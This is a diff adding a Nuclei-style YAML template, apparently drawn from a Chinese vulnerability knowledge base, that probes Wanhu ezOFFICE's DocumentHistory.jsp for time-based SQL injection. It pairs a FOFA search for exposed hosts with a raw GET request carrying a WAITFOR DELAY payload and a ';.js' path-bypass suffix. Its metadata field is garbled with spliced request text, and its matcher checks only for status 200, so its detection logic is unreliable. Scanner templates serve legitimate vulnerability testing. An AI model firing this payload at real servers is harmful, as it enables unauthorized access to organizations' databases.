@@ -1,0 +1,19 @@
+id: poc-1057911598
+info:
+  name: 万户 ezOFFICE DocumentHistory 存在SQL 注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  tags: sqli,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: app="万户网络-ezOFFICE"PoCGET /defaultroot/public/iSignatur”
+http:
+- raw:
+  - GET /defaultroot/public/iSignatureHTML.jsp/DocumentHistory.jsp;.js?DocumentID=1%27%20WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
